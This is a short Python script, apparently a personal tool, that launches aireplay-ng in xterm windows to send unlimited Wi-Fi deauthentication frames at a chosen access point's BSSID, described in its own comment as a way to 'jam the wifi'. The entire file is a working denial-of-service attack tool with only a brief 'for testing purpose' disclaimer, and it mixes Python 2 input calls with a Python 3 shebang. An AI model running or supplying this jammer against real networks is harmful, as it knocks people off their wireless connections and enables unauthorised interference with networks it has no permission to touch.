#!/usr/bin/env python3
#Akshay Singh
# Program uses aireplay to deauthenticate clients and jam the wifi.

import subprocess
import time

def jammer():
    try:
        print("\n")
        print("Make sure that the monitor mode is enabled before running the program.\n"
               "This is a test program, so no proper validation has been done.\n"
               "Make sure you put the right values.\n"
               "This program is for testing purpose.\n"
           )
        
        input_user = raw_input("Enter the monitor mode(wlan0mon or mon0): ")
        num = str(0)
        bssid_user = raw_input("Enter the BSSID of the target: ")
        #channel_user = raw_input("Enter the BSSID channel: ")
        repeat_user = int(raw_input("How many deauthentication attacks you want to run? "))
        if(repeat_user > 5 or repeat_user <= 0):
            print("Attacks should be in range of 1-5 \n")
        
        else:
            time.sleep(3)
            #channel_set = subprocess.Popen(["iwconfig", input_user, "channel", channel_user])
            for i in range(repeat_user):
                deauth_start = subprocess.Popen(['xterm', '-e',"aireplay-ng","--deauth", num, "-a", bssid_user,
                                        input_user, "--ignore-negative-one"])
                
    
    except ValueError:
        print("\n")
        print("Please check your input values")
    except KeyboardInterrupt:
        print("\n")
        print("Stopped by the User \n")
    
    print("Close the console windows to end the deauthentication processes")
    print("Reset your network adapter if the deautentication does not work")
jammer()
